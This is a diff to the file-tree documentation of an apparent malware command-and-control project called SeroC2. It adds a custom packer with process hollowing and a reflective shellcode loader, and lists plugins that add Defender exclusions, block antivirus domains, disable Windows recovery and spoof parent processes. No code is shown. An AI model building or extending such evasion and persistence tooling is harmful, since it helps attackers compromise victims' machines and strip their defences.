@@ -561,6 +561,8 @@ SeroC2/
 │   │   ├── ShellIcon.cs           # Shell icon extraction helper
 │   │   └── WindowResizer.cs       # Borderless window resize helper
 │   ├── Builder/                   # Build pipeline (config gen, NativeAOT, crypter bridge)
+│   │   ├── CustomPacker.cs        # Custom packer: LZMS + AES-256-CBC + process hollow; generates polymorphic C loader (MSVC compiled at runtime)
+│   │   ├── ShellcodeExport.cs     # Packages stub as PIC shellcode blob (.text section + XOR-encoded PE)
 │   │   ├── PluginSources.cs       # C++ plugin source templates + on-demand MSVC compilation
 │   │   └── Crypter.cs             # Crypter bridge — invokes closed-source native loader
 │   ├── Net/                       # TLS server · H264Decoder · Discord RPC · miner stats host
@@ -578,6 +580,7 @@ SeroC2/
 │   │   └── Packet.cs              # Packet type enum + all DTOs (entire protocol in one file)
 │   ├── Stubs/                     # Native C++ sources compiled + deployed at runtime
 │   │   ├── loader.cpp             # Native loader template (NtCreateSection, PPID spoof)
+│   │   ├── ShellcodeLoader.cpp    # PIC shellcode entry: XOR-decode stub PE, reflectively map + execute
 │   │   ├── plugin_excludedefender.cpp # AutoTask: add C:\ to Defender exclusions via WMI + SYSTEM token
 │   │   ├── plugin_blockavdns.cpp  # AutoTask: redirect AV domains to 127.0.0.1, block DoT
 │   │   ├── plugin_blockreset.cpp  # AutoTask: disable WRE, block USB imaging tools
